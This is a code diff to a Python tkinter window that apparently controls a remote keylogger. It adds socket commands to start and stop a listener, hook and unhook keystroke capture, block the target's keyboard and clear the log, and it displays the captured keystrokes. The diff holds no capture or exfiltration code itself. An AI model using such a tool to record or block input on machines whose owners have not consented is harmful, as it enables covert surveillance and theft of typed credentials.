@@ -10,6 +10,7 @@ class UI_keylogger(tk.Toplevel):
 
         super().__init__(parent)
         self.title = lb.KEYLOGGER_TITLE
+        self.protocol("WM_DELETE_WINDOW", self.close)
         self.resizable(False, False)
         self['padx'] = 10
         self['pady'] = 10
@@ -29,28 +30,36 @@ class UI_keylogger(tk.Toplevel):
         self.text_log.grid(row = 2, column = 0, columnspan = 2, pady = (10,0))
         self.text_log['state'] = 'disabled'
 
+        self.socket_cmd("listener-start")
         self.after(200, self.periodic_call)
 
     def hook(self):
         if self.btn_hook_stt.get() == lb.KEYLOGGER_HOOK:
             self.socket_cmd("listener-hook")
-        elif self.btn_hook_stt.get() == lb.KEYLOGGER_UNHOOK:
+            self.btn_hook_stt.set(lb.KEYLOGGER_UNHOOK)
+        else:
             self.socket_cmd("listener-unhook")
+            self.btn_hook_stt.set(lb.KEYLOGGER_HOOK)
 
-        self.btn_hook_stt.set(lb.WAIT)
+    def block(self):
+        if self.btn_block_stt.get() == lb.KEYLOGGER_BLOCK:
+            self.socket_cmd("listener-block")
+            self.btn_block_stt.set(lb.KEYLOGGER_UNBLOCK)
+        else:
+            self.socket_cmd("listener-unblock")
+            self.btn_block_stt.set(lb.KEYLOGGER_BLOCK)
 
     def clear(self):
         self.socket_cmd("listener-clear")
 
-        self.text_log.config(state = 'normal')
-        self.text_log.delete(1.0, tk.END)
-        self.text_log.config(state = 'disabled')
+        if self.btn_hook_stt.get() == lb.KEYLOGGER_HOOK:
+            self.text_log.config(state = 'normal')
+            self.text_log.delete(1.0, tk.END)
+            self.text_log.config(state = 'disabled')
 
-    def block(self):
-        if self.btn_block_stt.get() == lb.KEYLOGGER_BLOCK:
-            self.btn_block_stt.set(lb.KEYLOGGER_UNBLOCK)
-        else:
-            self.btn_block_stt.set(lb.KEYLOGGER_BLOCK)
+    def close(self):
+        self.socket_cmd("listener-stop")
+        self.destroy()
 
     def update_ui(self, task):
         DEBUG("task", task)
@@ -59,12 +68,8 @@ class UI_keylogger(tk.Toplevel):
         if cmd == "update-log":
             self.text_log.config(state = 'normal')
             self.text_log.delete(1.0, tk.END)
-            self.text_log.insert(tk.END, ext)
+            self.text_log.insert(tk.INSERT, ext)
             self.text_log.config(state = 'disabled')
-        elif cmd == "hook":
-            self.btn_hook_stt.set(lb.KEYLOGGER_HOOK)
-        elif cmd == "unhook":
-            self.btn_hook_stt.set(lb.KEYLOGGER_UNHOOK)
 
     def periodic_call(self):
         if self.btn_hook_stt.get() == lb.KEYLOGGER_UNHOOK:
